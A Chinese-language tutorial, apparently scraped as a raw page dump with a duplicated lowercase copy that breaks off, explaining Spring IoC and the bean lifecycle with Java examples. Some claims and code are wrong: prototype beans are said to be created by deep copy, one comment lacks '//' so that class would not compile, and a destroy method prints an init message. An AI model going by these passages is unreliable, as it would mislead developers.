ResourceLoader为我们提供了一个统一的getResource()方法来通过资源路径检索外部资源。从而将资源或文件(例如文本文件、XML文件、属性文件或图像文件)加载到Spring应用程序上下文中的不同实现 ，其实说白了，就是用来加载外部资源的；方法中有个参数：ResourceLoader ，这个参数其实就是ApplicationContext（spring 的上下文对象）；可直接强转；\n\npackage org.crazyit.app.service;\nimport org.springframework.context.ResourceLoaderAware;\nimport org.springframework.core.io.ResourceLoader;\npublic class TestBean implements ResourceLoaderAware{\n   \n    public void setResourceLoader(ResourceLoader resourceLoader) {\n        // 可直接强转为 ApplicationContext\n        ApplicationContext context = (ApplicationContext) resourceLoader;\n \n        System.out.println("6 我是 ResourceLoaderAware 的 setResourceLoader 方法");\n    }\n   \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n并且我们可以指定不同的前缀来创建路径以从不同位置加载资源\n\n\n\n\n# 6.7 ApplicationEventPublisherAware.setApplicationEventPublisher()；\n\nApplicationEventPublisherAware是一个事件发布器的接口，使用这个接口，我们自己的 Service 就拥有了发布事件的能力。用户注册后，不再是显示调用其他的业务 Service，而是发布一个用户注册事件。那么在这里是发布事件，那就肯定有监听事件的接口，这个接口叫做 ApplicationListener <E extends ApplicationEvent > ，只要实现 ApplicationListener 接口就可以接受发布的事件了，接下来我们写一个示例来模拟发布事件和监听事件；\n\n先创建一个实体类，用来存储发布的事件内容   StringEvent.java\n\npackage com.Spring.Boot.init.listener.eventModel;\nimport org.springframework.context.ApplicationEvent;\n//事件监听对象\npublic class StringEvent extends ApplicationEvent {\n \n    private String str;\n    // 构造函数\n    public StringEvent(Object source) {\n        super(source);\n        str = source.toString();\n    }\n    // 获取字符串\n    public String getStr(){\n        return str;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n创建一个发布事件的类：ExtApplicationEventPublisherAware.java ，实现 ApplicationEventPublisherAware  接口增加发布事件的功能；\n\npackage com.Spring.Boot.init.aware;\n \nimport com.Spring.Boot.init.listener.eventModel.StringEvent;\nimport org.springframework.context.ApplicationEventPublisher;\nimport org.springframework.context.ApplicationEventPublisherAware;\nimport org.springframework.stereotype.Component;\n \n/**\n * 发布事件\n */\n@Component\npublic class ExtApplicationEventPublisherAware implements ApplicationEventPublisherAware {\n    @Override\n    public void setApplicationEventPublisher(ApplicationEventPublisher applicationEventPublisher) {\n        System.out.println("发布事件，事件对象为 StringEvent ，内容为 ：1234");\n        StringEvent stringEvent = new StringEvent("1234");\n        // 发布事件 ，发布后会在 ApplicationListener.onApplicationEvent()方法进行捕获；\n        applicationEventPublisher.publishEvent(stringEvent);  // 发布事件\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n在创建一个事件监听器：  EventListener.java ，用来监听所有发布的事件；\n\npackage com.Spring.Boot.init.listener;\n \n \nimport com.Spring.Boot.init.listener.eventModel.StringEvent;\nimport org.springframework.context.ApplicationEvent;\nimport org.springframework.context.ApplicationListener;\nimport org.springframework.stereotype.Component;\n \n//事件监听器\n@Component\npublic class EventListener implements ApplicationListener<StringEvent> {\n \n    @Override\n    public void onApplicationEvent(StringEvent o) {\n        System.out.println("监听到事件，内容："+o.getStr());\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n接下来，运行spring项目，看看打印的结果如下，到这里，事件的发布和监听就完成了；\n\n\n\n\n# 6.8 MessageSourceAware.setMessageSource()\n\n国际化消息通知操作\n\n\n# 6.9 ApplicationContextAware.setApplicationContext()\n\nApplicationContextAware 主要用来全局获取 ApplicationContext 上下文，ApplicationContext其实就是容器，为此我们可以实现 ApplicationContextAware 接口来获取ApplicationContext容器对象；我们可以把它做成一个公共的静态类，这样可以在任意地方想拿就拿了，\n\npackage com.Spring.Boot.init.aware;\n \nimport org.springframework.beans.BeansException;\nimport org.springframework.context.ApplicationContext;\nimport org.springframework.context.ApplicationContextAware;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.stereotype.Component;\n \n@Component\npublic class ExtApplicationContextAware implements ApplicationContextAware {\n \n    /**\n     * Spring容器会在加载完Spring容器后调用ApplicationContextAware.setApplicationContext方法\n     * ApplicationContextAware 主要用来全局获取 ApplicationContext 上下文，\n     */\n \n    private static ApplicationContext applicationContext;\n \n    @Override\n    public void setApplicationContext(ApplicationContext applicationContext) throws BeansException {\n        if (ExtApplicationContextAware.applicationContext == null) {\n            ExtApplicationContextAware.applicationContext = applicationContext;\n        }\n        System.out.println("========ApplicationContext配置成功========");\n        System.out.println("========在普通类可以通过调用SpringBootBeanUtil.getApplicationContext()获取applicationContext对象========");\n        System.out.println("========applicationContext="+ ExtApplicationContextAware.applicationContext +"========");\n    }\n \n    /**\n     * 获取applicationContext\n     * @return\n     */\n    public static ApplicationContext getApplicationContext() {\n        return applicationContext;\n    }\n \n    /**\n     * 通过name获取 Bean.\n     * @param name\n     * @return\n     */\n    public static Object getBean(String name) {\n        return getApplicationContext().getBean(name);\n    }\n \n    /**\n     * 通过class获取Bean.\n     * @param clazz\n     * @return\n     */\n    public static <T> T getBean(Class<T> clazz) {\n        return getApplicationContext().getBean(clazz);\n    }\n \n    /**\n     * 通过name,以及Clazz返回指定的Bean\n     * @param name\n     * @param clazz\n     * @return\n     */\n    public static <T> T getBean(String name, Class<T> clazz) {\n        return getApplicationContext().getBean(name, clazz);\n    }\n \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n\n\n当然，也可以直接注入，就像这样：\n\n @Autowired\n private ApplicationContext applicationContext;\n\n\n1\n2\n\n\n\n# 6.10 ServletContextAware.setServletContext()\n\n通过实现ServletContextAware接口可获取servletContext，也就是servlet的上下文；\n\n什么是ServletContext ： WEB容器在启动时，它会为每个WEB应用程序都创建一个对应的ServletContext对象，它代表当前web应用。ServletConfig对象中维护了ServletContext对象的引用，开发人员在编写servlet时，可以通过ServletConfig.getServletContext方法获得ServletContext对象。 由于一个WEB应用中的所有Servlet共享同一个ServletContext对象，因此Servlet对象之间可以通过ServletContext对象来实现通讯。ServletContext对象通常也被称之为context域对象。\n\n\n# 6.11 LoadTimeWeaverAware.setLoadTimeWeaver()\n\n其实在调试的时候还有2个没打印出来，第11个就是 LoadTimeWeaver， 简称LTW，LTW是AOP的一种实现方式，此方法是为了获取Aop织入的对象，使用的织入方式是：类加载期织入， 一般的aop都是运行期织入，就是在运行的时候才进行织入切面方法，但是LTW是在类加载前就被织入了，也就是class文件在jvm加载之前进行织入切面方法 只有在使用 @EnableLoadTimeWeaving 或者存在 LoadTimeWeaver 实现的 Bean 时才会调用，顺序也很靠后;\n\n\n# 6.12  ImportAware.setImportMetadata()\n\n还有一个没打印的就是ImportAware接口，这个接口的方法只有被其他配置类 @Import(XX.class) 时才会调用，这个调用对 XX.class 中的所有 @Bean 来说顺序是第 1 的。\n\n\n# 7、初始化前置\n\n方法名称： BeanPostProcessor.postProcessBeforeInitialization()\n\n在每一个 Bean 初始化之前执行的方法（有多少 Bean 调用多少次）\n\n注意 ： 启用该方法后，标注了@PostConstruct注解的方法会失效\n\n\n# 8、初始化后置\n\n方法名称： BeanPostProcessor.postProcessAfterInitialization()\n\n在每一个 Bean 初始化之后执行的方法（有多少 Bean 调用多少次）\n\n初始化前置和初始化后置的实现代码如下\n\npackage com.Spring.Boot.init;\nimport org.springframework.beans.BeansException;\nimport org.springframework.beans.factory.config.BeanPostProcessor;\nimport org.springframework.stereotype.Component;\n \n@Component\npublic class ExtBeanPostProcessor implements BeanPostProcessor {\n    @Override\n    public Object postProcessBeforeInitialization(Object bean, String beanName) throws BeansException {\n        // 在每一个 Bean 初始化之前执行的方法（有多少 Bean 调用多少次）\n        // 注意 ： 启用该方法后，标注了@PostConstruct注解的方法会失效\n        System.out.println("初始化前置方法");\n        return null;\n    }\n    @Override\n    public Object postProcessAfterInitialization(Object bean, String beanName) throws BeansException {\n         在每一个 Bean 初始化之后执行的方法（有多少 Bean 调用多少次）\n        System.out.println("初始化后置方法");\n        return null;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# 9、执行初始化方法\n\n初始化方法有三个，分别是 添加了@PostConstruct 注解的方法、实现InitializingBean接口、在@bean注解上添加 initMethod属性；我们一个个讲\n\n\n# 9.1 初始化方法一：@PostConstruct\n\n在bean对象内添加@PostConstruct 注解后即可实现初始化的功能，被@PostConstruct修饰的方法会在构造函数之后，init()方法之前运行。 有多个则会执行多次；\n\n注意： 如果spring 实现了 BeanPostProcessor接口的postProcessBeforeInitialization() 方法，也就是12的初始后置方法，那么@PostConstruct注解会失效；\n\n代码示例\n\npackage com.Spring.Boot.init;\nimport org.springframework.stereotype.Component;\nimport javax.annotation.PostConstruct;\n \n// @PostConstruct注解\n@Component\npublic class ExtPostConstruct {\n \n    /**\n     * 被@PostConstruct修饰的方法会在构造函数之后，init()方法之前运行。如果有多个则会执行多次\n     * 注意： 如果spring 实现了 BeanPostProcessor接口的postProcessBeforeInitialization方法，该@PostConstruct注解会失效\n     */\n    @PostConstruct\n    public void init() {\n        System.out.println("第一个init...");\n    }\n \n    // 有多个会执行多次\n    @PostConstruct\n    public void init1() {\n        System.out.println("第二个init1...");\n    }\n \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n\n# 9.2 InitializingBean.afterPropertiesSet()\n\nspring 初始化方法之一，作用是在BeanFactory完成属性设置之后,执行自定义的初始化行为。\n\n执行顺序：在initMethod之前执行，在@PostConstruct之后执行\n\n代码示例\n\npackage com.Spring.Boot.init;\nimport org.springframework.beans.factory.InitializingBean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.stereotype.Component;\n \n@Component\npublic class ExtInitializingBean implements InitializingBean {\n    @Override\n    public void afterPropertiesSet() throws Exception {\n        // 一个 InitializingBean 执行一次\n        // spring 初始化方法，作用是在BeanFactory完成属性设置之后,执行自定义的  初始化行为.\n        // 执行顺序：在initMethod之前执行，在@PostConstruct之后执行\n        System.out.println("InitializingBean");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# 9.3 init-method\n\nbean 配置文件属性 init-method 用于在bean初始化时指定执行方法，用来替代继承 InitializingBean接口,\n\n注意的一点是只有一个类完整的实例被创建出来后，才能走初始化方法。\n\n示例代码，先定义一个类： BeanTest.java ，在类中定义一个初始化方法 initMethod_1()\n\npackage com.Spring.Boot.init.bean;\n \npublic class BeanTest {\n    \n    // 将要执行的初始化方法\n    public void initMethod_1(){\n        System.out.println("我是beanTest的init方法");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nxml 配置方式\n\n<bean id="beanTest" class="com.BeanTest" init-method="init"></bean> \n\n\n1\n\n\n注解配置方式\n\npackage com.Spring.Boot.init;\nimport com.Spring.Boot.init.bean.BeanTest;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.stereotype.Component;\n@Component()\npublic class InitMethod  {\n    \n    // 在@Bean注解上添加initMethod属性，指向类中的 initMethod_1 执行初始化方法\n    @Bean(initMethod = "initMethod_1")\n    public BeanTest getBeanTest(){\n        return new BeanTest();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# 10、使用中\n\n到这一步，bean对象就已经完全创建好了，是一个完整对象了，并且正在被其他对象使用了；\n\n\n# 11、销毁流程\n\n在这里需要先说一下，被spring容器管理的bean默认是单例的，默认在类上面有个 @Scope注解，也就是这样的\n\npackage com.Spring.Boot.init;\n \nimport org.springframework.beans.factory.config.ConfigurableBeanFactory;\nimport org.springframework.context.annotation.Scope;\nimport org.springframework.stereotype.Component;\n \n@Component()\n@Scope(value = ConfigurableBeanFactory.SCOPE_SINGLETON)\n// @Scope(value = "singleton")  // 也可以这样写\npublic class InitMethod  {\n \n  // methods....\n \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n如果要设置成多例，只需要把@Scope的属性值改一下就行，就像这样，多例模式也叫原型模式，它底层不是重新创建一个bean对象出来，而是使用深拷贝技术实现的，就是复制一个对象出来进行使用\n\n@Scope(value = ConfigurableBeanFactory.SCOPE_PROTOTYPE)\n// @Scope(value = "prototype") // 也可以这样写\n\n\n1\n2\n\n\n为什么要介绍单例和多例呢？ 因为啊，销毁流程的走向就跟你是单例还是多例有关；\n\n如果是单例模式，会先执行 DisposableBean.destroy()方法，然后在执行 destroy-Method 方法；\n\n\n# 11.1  DisposableBean.destroy()\n\n单例模式的销毁方式，示例代码\n\npackage com.Spring.Boot.init.destroy;\n \nimport org.springframework.beans.factory.DisposableBean;\nimport org.springframework.stereotype.Component;\n \n/**\n * 销毁方法\n */\n@Component\npublic class ExtDisposableBean implements DisposableBean {\n    @Override\n    public void destroy() throws Exception {\n        System.out.println("我被销毁了");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n当结束main方法时，控制台打印的结果如下\n\n\n# 11.2  destory-method方法\n\n还是拿 第11 个流程的例子来讲，只不过这次我们在@Bean注解里加上 destroyMethod属性，指向销毁方法 ：destroyMethod_1()\n\npackage com.Spring.Boot.init;\n \nimport com.Spring.Boot.init.bean.BeanTest;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.stereotype.Component;\n \n@Component()\npublic class InitMethod  {\n \n    // 在@Bean注解上添加initMethod属性，指向类中的 initMethod_1 执行初始化方法\n    // 在@Bean注解上添加destroyMethod属性，指向类中的 destroyMethod_1 执行销毁方法\n    @Bean(initMethod = "initMethod_1",destroyMethod = "destroyMethod_1")\n    public BeanTest getBeanTest(){\n        return new BeanTest();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nBeanTest.java\n\npackage com.Spring.Boot.init.bean;\n \npublic class BeanTest {\n \n    // 将要执行的初始化方法\n    public void initMethod_1(){\n        System.out.println("我是beanTest的init方法");\n    }\n \n    // 将要执行的销毁方法\n    public void destroyMethod_1(){\n        System.out.println("我是beanTest的init方法");\n    }\n \n \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nxml的配置方式\n\n<bean id="beanTest" class="com.BeanTest" destroy-method="destroyMethod_1"></bean>\n\n\n\n1\n2\n\n\n\n# 12、返回bean给用户，剩下的生命周期由用户控制\n\n因为多例模式下，spring无法进行管理，所以将生命周期交给用户控制，用户用完bean对象后，java垃圾处理器会自动将无用的对象进行回收操作；',normalizedContent:'# spring ioc\n\n首先，在此之前，我们就必须先知道什么是ioc，ioc叫做控制反转，也可以称为依赖注入（di），实际上依赖注入是ioc的另一种说法，\n\n 1. 谁控制谁？：在以前，对象的创建和销毁都是由用户控制的，用了ioc之后，对象的创建和销毁就都交给容器来控制了，用户就不用管这些，只关注业务需求就好了；\n\n 2. 什么是反转？：既然叫反转，肯定就有正转，正转其实就是对象去找实例，而反转就反过来了嘛，让实例来找对象；怎么找呢？当然是通过容器啦！\n    \n    \n\n 3. 谁依赖谁？：在spring项目中，将对象理解为bean，也可以叫bean对象，这个bean和容器之间有个依赖关系，bean对象的创建是依赖容器的，就好像孩子依赖父母一样，孩子不能自己生出自己，需要父母的合作才能出生，这里的孩子就是bean，父母就是容器；\n\n 4. 谁注入谁？：通过容器注入了bean对象，而且这个过程是自动化的，也就是说容器会自动找到和bean对象匹配的类型实例注入到对象中；\n\n\n# spring ioc的加载过程\n\n了解完控制反转和依赖注入，接下来我们在看看ioc的加载过程，ioc的整个加载过程如下图，先看看大致的流程，然后再慢慢深入 （其中黄色的框内是注释内容）\n\n\n\n1、首先，通过beandefinitionreader 读取指定的配置文件生成bean的定义信息，然后到完整的bean定义信息(beandefinition对象)，注意这里只是存储bean的定义信息，还没有实例化bean对象；就像工厂里面一样，原材料已经准备好了，但是还没有进行生产，原材料就是beandefinition，生产就是实例化\n\n2、在 beandefinition 和 完整beandefinition 中间通过一个后置增强器，可以对bean的定义信息进行统一修改，只需要实现 beanfactorypostprocessor 接口即可，这个后置增强器是可以有多个的，你只要在不同的类实现多个 beanfactorypostprocessor 接口就会执行多次，就像这样：\n\npackage com.spring.boot.init;\nimport org.springframework.beans.beansexception;\nimport org.springframework.beans.factory.config.beanfactorypostprocessor;\nimport org.springframework.beans.factory.config.configurablelistablebeanfactory;\nimport org.springframework.stereotype.component;\n/**\n * 扩展方法--后置增强器（可修改bean的定义信息）\n */\n@component\npublic class extbeanfactorypostprocessor implements beanfactorypostprocessor {\n    @override\n    public void postprocessbeanfactory(configurablelistablebeanfactory beanfactory) throws beansexception {\n//        beandefinition studentservice = beanfactory.getbeandefinition("studentservice");\n        system.out.println("扩展方法--可进行修改beandefinition的定义信息");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n3、得到 完整beandefinition 之后就可以进行创建对象了，这整个过程被称为 bean 的生命周期，也就是从实例化到销毁的过程；那么这时候爱学习童鞋就要发问了：“对象创建和销毁有这么麻烦嘛？直接反射实例化一个对象不就行了嘛？为啥还有初始化？”； 首先，这是个好问题，来，我们先把掌声送给这位发问的同学；我想说的是，就算是普通的new一个对象出来，里面也会经过实例化和初始化，有兴趣的话请看我的另一篇文章 ： java创建对象过程 实例化和初始化； 接下来我们重点讲bean的生命周期;\n\n\n# spring bean的生命周期\n\n粗略来看，bean的生命周期主要分为以下4个步骤\n\n\n\n但其实，它的内部蕴含了很多东西，让我们看看细化后的流程图；\n\n\n\n怎么样？ 是不是看到了很多没见过的东西？好像认识几个，但大多都是没见过的东东，不知道不要紧，接下来我们一个个地讲解\n\n接下来我们要将1、3、4 放到一起讲，是因为它们是在同一个接口里面的，实现 instantiationawarebeanpostprocessor 接口即可\n\npackage com.spring.boot.init;\n \nimport org.springframework.beans.beansexception;\nimport org.springframework.beans.factory.config.instantiationawarebeanpostprocessor;\nimport org.springframework.stereotype.component;\n \n@component\npublic class myinstantiationawarebeanpostprocessor implements instantiationawarebeanpostprocessor {\n \n    // 实例化前置\n    @override\n    public object postprocessbeforeinstantiation(class<?> beanclass, string beanname) throws beansexception {\n        \n        system.out.println("postprocessbeforeinstantiation被调用了----在对象实例化之前调用-----beanname:" + beanname);\n        // 默认什么都不做，返回null\n        return null;\n    }\n \n    // 实例化后置\n    @override\n    public boolean postprocessafterinstantiation(object bean, string beanname) throws beansexception {\n        system.out.println("postprocessafterinstantiation被调用了---------beanname:" + beanname);\n        //默认返回true，什么也不做，继续下一步\n        return true;\n    }\n    \n    // 属性修改\n    @override\n    public propertyvalues postprocesspropertyvalues(propertyvalues pvs, propertydescriptor[] pds, object bean, string beanname) throws beansexception {\n        system.out.println("postprocesspropertyvalues被调用了---------beanname:"+beanname);\n        // 此方法可对bean中的属性值进行、添加、修改、删除操作；\n        // 对属性值进行修改，如果postprocessafterinstantiation方法返回false，该方法可能不会被调用，\n        return pvs;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\n下面我们依次解释\n\n\n# 1、实例化前置\n\n实例化前置使用的是 instantiationawarebeanpostprocessor.postprocessbeforeinstantiation(class<?> beanclass, string beanname) 方法，方法里有2个参数，分别是beanclass和beanname，顾名思义，就是对在对象实例化之前对bean对象的class信息进行修改或者扩展，以达到我们想要的功能，它的底层是动态代理aop技术实现的；且是bean生命周期中最先执行的方法；\n\n返回非空：返回值是object类型，这意味着我们可以返回任何类型的值，由于这个时候目标对象还未实例化，所以这个返回值可以用来代替原本该生成对象的目标对象的实例，也就是说，如果返回了非空的值，那么以后我们需要用到这个bean的时候，拿到的就现在返回的对象了，也就不会去走第二步去实例化对象了；\n\n返回空（null）值：默认也是返回null值的，那么就直接返回，接下来会调用docreatebean方法来实例化对象；\n\n\n# 2、实例化对象\n\ndocreatebean方法创建实例，用反射技术创建，这个没什么好说的，只是相当于new了一个对象出来而已，但需要注意的是，这个时候只是将对象实例化了，对象内的属性还未设置；\n\n\n# 3、实例化后置\n\n方法名称： instantiationawarebeanpostprocessor.postprocessafterinstantiation(object bean, string beanname)\n\n在目标对象实例化之后调用，这个时候对象已经被实例化，但是该实例的属性还未被设置，都是null。因为他的返回值是决定要不要调用postprocesspropertyvalues方法中的一个因素(因为还有一个因素是mbd.getdependencycheck());\n\n返回false ：如果该方法返回false，并且不需要check，那么postprocesspropertyvalues就会被忽略不执行；\n\n返回true ： 如果返回true，postprocesspropertyvalues就会被执行\n\n\n# 4、属性修改\n\n方法名称 ：instantiationawarebeanpostprocessor.propertyvalues postprocesspropertyvalues(propertyvalues pvs, propertydescriptor[] pds, object bean, string beanname)\n\n此方法可对属性值进行修改，修改范围包括添加、修改、删除操作；，如果实例化后置 postprocessafterinstantiation() 方法返回false，那么该方法不会被调用；\n\n\n# 5、给用户属性赋值\n\n用户属性指的是用spring 的人自定义的bean对象属性，像 user、student、teacher 、userservice、indexservice 这类的对象都是自定义bean对象，第5步主要给这类属性进行赋值操作，使用的是  abstractautowirecapablebeanfactory.populatebean() 方法进行赋值；\n\n\n# 6、给容器属性赋值\n\n容器属性其实就是容器自带的属性，这些属性都是spring本来就有的；可以肯定的是，它们都是 aware 接口的实现类，主要有以下实现类，我已经将它们的执行顺序都排列好了，\n\n\n\n我们先看看怎么用，然后再来讲解每个aware的作用；上代码\n\npackage com.spring.boot.init.aware;\n \nimport org.springframework.beans.beansexception;\nimport org.springframework.beans.factory.beanclassloaderaware;\nimport org.springframework.beans.factory.beanfactory;\nimport org.springframework.beans.factory.beanfactoryaware;\nimport org.springframework.beans.factory.beannameaware;\nimport org.springframework.context.*;\nimport org.springframework.context.annotation.importaware;\nimport org.springframework.context.weaving.loadtimeweaveraware;\nimport org.springframework.core.env.environment;\nimport org.springframework.core.io.resourceloader;\nimport org.springframework.core.type.annotationmetadata;\nimport org.springframework.instrument.classloading.loadtimeweaver;\nimport org.springframework.stereotype.component;\nimport org.springframework.util.stringvalueresolver;\nimport org.springframework.web.context.servletcontextaware;\nimport javax.servlet.servletcontext;\n \n@component\npublic class allawareinterface  implements beannameaware, beanclassloaderaware,\n        beanfactoryaware, environmentaware, embeddedvalueresolveraware,\n        resourceloaderaware, applicationeventpublisheraware, messagesourceaware,\n        applicationcontextaware, servletcontextaware, loadtimeweaveraware, importaware {\n \n    @override\n    public void setbeanname(string name) {\n        // beannameaware作用：让bean对name有知觉\n        //这个方法只是简单的返回我们当前的beanname,听官方的意思是这个接口更多的使用在spring的框架代码中，实际开发环境应该不建议使用\n        system.out.println("1 我是 beannameaware 的 setbeanname 方法  ---参数：name，内容："+ name);\n    }\n    @override\n    public void setbeanclassloader(classloader classloader) {\n        system.out.println("2 我是 beanclassloaderaware 的 setbeanclassloader 方法");\n    }\n    @override\n    public void setbeanfactory(beanfactory beanfactory) throws beansexception {\n        // 注意： 如果使用 @configuration 注解的话，setbeanfactory方法会执行2次，\n        system.out.println("3 我是 beanfactoryaware 的 setbeanfactory 方法");\n    }\n    @override\n    public void setenvironment(environment environment) {\n        system.out.println("4 我是 environmentaware 的 setenvironment 方法");\n    }\n    @override\n    public void setembeddedvalueresolver(stringvalueresolver stringvalueresolver) {\n        system.out.println("5 我是 embeddedvalueresolveraware 的 setembeddedvalueresolver 方法");\n    }\n    @override\n    public void setresourceloader(resourceloader resourceloader) {\n        system.out.println("6 我是 resourceloaderaware 的 setresourceloader 方法");\n    }\n    @override\n    public void setapplicationeventpublisher(applicationeventpublisher applicationeventpublisher) {\n        system.out.println("7 我是 applicationeventpublisheraware 的 setapplicationeventpublisher 方法");\n    }\n    @override\n    public void setmessagesource(messagesource messagesource) {\n        system.out.println("8 我是 messagesourceaware 的 setmessagesource 方法");\n    }\n    @override\n    public void setapplicationcontext(applicationcontext applicationcontext) throws beansexception {\n        system.out.println("9 我是 applicationcontextaware 的 setapplicationcontext 方法");\n    }\n    @override\n    public void setservletcontext(servletcontext servletcontext) {\n        system.out.println("10 我是 servletcontextaware 的 setservletcontext 方法");\n    }\n    @override\n    public void setloadtimeweaver(loadtimeweaver loadtimeweaver) {\n        //loadtimeweaver 简称ltw，ltw是aop的一种实现方式，此方法是为了获取aop织入的对象，使用的织入方式是：类加载期织入，\n        // 一般的aop都是运行期织入，就是在运行的时候才进行织入切面方法，但是ltw是在类加载前就被织入了，也就是class文件在jvm加载之前进行织入切面方法\n        // 只有在使用 @enableloadtimeweaving 或者存在 loadtimeweaver 实现的 bean 时才会调用，顺序也很靠后\n        system.out.println("11 我是 loadtimeweaveraware 的 setloadtimeweaver 方法");\n    }\n    @override\n    public void setimportmetadata(annotationmetadata annotationmetadata) {\n        //只有被其他配置类 @import(xx.class) 时才会调用，这个调用对 xx.class 中的所有 @bean 来说顺序是第 1 的。\n        system.out.println("12 我是 importaware 的 setimportmetadata 方法");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n\n\n启动spring后的控制台打印的部分结果如下：\n\n\n\n可以看到它们的输出结果按照顺序依次排列打印出来了，这就是它的标准顺序了；接下来我们了解下它们的具体作用\n\n\n# 6.1  beannameaware.setbeanname()\n\n这个方法只是简单的返回我们当前的beanname,听官方的意思是这个接口更多的使用在spring的框架代码中，实际开发环境应该不建议使用\n\n\n# 6.2  beanclassloaderaware.setbeanclassloader()\n\n获取bean的类装载器，\n\n\n# 6.3 beanfactoryaware.setbeanfactory()\n\n获取bean工厂，beanfactory让你可以不依赖注入方式，随意的读取ioc容器里面的对象，不过beanfactory本身还是要注入的。\n\n需要注意的是，一般情况下我们都用  @component 注解，如果使用 @configuration 注解的话，setbeanfactory方法会执行2次；\n\n\n# 6.4 environmentaware.setenvironment()\n\n实现了environmentaware接口重写setenvironment方法后，在工程启动时可以获得application.properties 、xml、yml 的配置文件配置的属性值。\n\n\n# 6.5  embeddedvalueresolveraware.setembeddedvalueresolver()\n\n通常我们使用@value注解来获取properties 和 yml 文件中的值，每个类中都要使用@value也很繁琐，实现embeddedvalueresolveraware接口后就方便多了。用法也跟@value一样，需要用${}包裹住；\n\n@component   \npublic class propertiesutil implements embeddedvalueresolveraware {\n \n\t@override\n\tpublic void setembeddedvalueresolver(stringvalueresolver stringvalueresolver) {   \n     system.out.println(stringvalueresolver.resolvestringvalue("${logging.file}"));\n\t}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 6.6 resourceloaderaware.setresourceloader()\n\nspring resourceloader为我们提供了一个统一的getresource()方法来通过资源路径检索外部资源。从而将资源或文件(例如文本文件、xml文件、属性文件或图像文件)加载到spring应用程序上下文中的不同实现 ，其实说白了，就是用来加载外部资源的；方法中有个参数：resourceloader ，这个参数其实就是applicationcontext（spring 的上下文对象）；可直接强转；\n\npackage org.crazyit.app.service;\nimport org.springframework.context.resourceloaderaware;\nimport org.springframework.core.io.resourceloader;\npublic class testbean implements resourceloaderaware{\n   \n    public void setresourceloader(resourceloader resourceloader) {\n        // 可直接强转为 applicationcontext\n        applicationcontext context = (applicationcontext) resourceloader;\n \n        system.out.println("6 我是 resourceloaderaware 的 setresourceloader 方法");\n    }\n   \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n并且我们可以指定不同的前缀来创建路径以从不同位置加载资源\n\n\n\n\n# 6.7 applicationeventpublisheraware.setapplicationeventpublisher()；\n\napplicationeventpublisheraware是一个事件发布器的接口，使用这个接口，我们自己的 service 就拥有了发布事件的能力。用户注册后，不再是显示调用其他的业务 service，而是发布一个用户注册事件。那么在这里是发布事件，那就肯定有监听事件的接口，这个接口叫做 applicationlistener <e extends applicationevent > ，只要实现 applicationlistener 接口就可以接受发布的事件了，接下来我们写一个示例来模拟发布事件和监听事件；\n\n先创建一个实体类，用来存储发布的事件内容   stringevent.java\n\npackage com.spring.boot.init.listener.eventmodel;\nimport org.springframework.context.applicationevent;\n//事件监听对象\npublic class stringevent extends applicationevent {\n \n    private string str;\n    // 构造函数\n    public stringevent(object source) {\n        super(source);\n        str = source.tostring();\n    }\n    // 获取字符串\n    public string getstr(){\n        return str;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n创建一个发布事件的类：extapplicationeventpublisheraware.java ，实现 applicationeventpublisheraware  接口增加发布事件的功能；\n\npackage com.spring.boot.init.aware;\n \nimport com.spring.boot.init.listener.eventmodel.stringevent;\nimport 